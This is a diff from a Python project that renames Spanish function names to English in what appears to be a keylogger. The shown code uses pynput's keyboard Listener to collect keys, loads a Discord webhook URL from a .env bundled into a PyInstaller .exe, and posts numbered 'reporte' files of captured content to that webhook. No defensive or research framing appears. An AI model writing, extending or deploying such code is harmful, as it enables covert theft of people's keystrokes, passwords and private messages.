@@ -6,19 +6,19 @@ from dotenv import load_dotenv
 from pynput.keyboard import Key, Listener
 
 
-def ruta_recurso(nombre: str) -> str:
+def resource_path(nombre: str) -> str:
     # Dentro de un .exe hecho con PyInstaller, los recursos se extraen en sys._MEIPASS
     base = getattr(sys, "_MEIPASS", os.path.dirname(os.path.abspath(__file__)))
     return os.path.join(base, nombre)
 
 
 keys = []
-load_dotenv(ruta_recurso(".env"))
+load_dotenv(resource_path(".env"))
 WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL")
 _numero_lote = 0
 
 
-def enviar_reporte(contenido: str, mensaje: str = "Reporte", nombre_archivo: str = "reporte.txt"):
+def send_report(contenido: str, mensaje: str = "Reporte", nombre_archivo: str = "reporte.txt"):
     if not WEBHOOK_URL:
         raise RuntimeError("No se encontró la URL del webhook (revisa tu .env)")
     r = requests.post(
@@ -83,7 +83,7 @@ def write_file(keys):
             contenido = f.getvalue()
 
     _numero_lote += 1
-    enviar_reporte(
+    send_report(
         contenido,
         mensaje=f"Reporte #{_numero_lote}",
         nombre_archivo=f"reporte_{_numero_lote}.txt",
